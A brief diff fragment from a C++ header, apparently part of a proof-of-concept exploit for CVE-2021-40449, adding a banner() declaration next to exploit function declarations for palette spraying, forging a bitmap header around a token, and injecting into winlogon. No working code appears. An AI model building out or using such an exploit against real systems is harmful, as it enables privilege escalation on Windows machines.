@@ -16,7 +16,7 @@ namespace CVE_2021_40449
 {
     inline bool trigger = false;
     inline HDC pocHDC;
-
+    void banner();
     VOID InjectToWinlogon();
     VOID EXPSprayPalettes(DWORD size);
     DWORD64 CreateForgedBitMapHeader(DWORD64 token);
